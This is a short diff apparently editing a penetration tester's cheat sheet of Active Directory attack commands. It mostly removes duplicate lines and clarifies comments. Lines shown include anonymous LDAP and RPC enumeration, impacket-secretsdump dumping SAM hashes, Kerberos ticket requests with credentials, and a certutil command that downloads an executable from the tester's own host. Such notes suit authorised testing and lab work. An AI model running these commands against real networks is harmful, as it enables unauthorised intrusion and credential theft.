@@ -121,16 +121,12 @@ rpcclient -U "" -N $targetip
 # LDAP ENUMERATION
 ######################################################################
 
-# Anonymous LDAP search - base DSE
+# Anonymous LDAP search - base DSE this will return basedn.
 ldapsearch -x -H ldap://$targetip -s base
 
 # LDAP domain enumeration with base DN - set $basedn manually
 # Example: basedn='dc=hq,dc=vanguard,dc=bank'
 # How to automatically generate the baseDN from the domain
-1- ldapsearch -x -H ldap://$targetip -s base
-#if not works
-2- basedn=$(echo $domain | sed 's/\./,dc=/g' | sed 's/^/dc=/')
-
 ldapsearch -x -H ldap://$targetip -b "$basedn"
 
 # NetExec LDAP users enumeration with anonymous or known creds
@@ -238,12 +234,6 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 impacket-getTGT $domain/$user:$password
 
 # Simple SMB authentication test
-impacket-smbclient $domain/$user:$password@$targetip
-
-# Request a Kerberos TGT (great for testing creds)
-impacket-getTGT $domain/$user:$password
-
-# Test SMB authentication directly
 impacket-smbclient $domain/$user:$password@$targetip
 
 # Constrained Delegation - Obtain service ticket as another user
@@ -635,6 +625,7 @@ certutil -urlcache -split -f http://$localip/file.exe file.exe
 ######################################################################
 
 ######################################################################
+
 
 
 
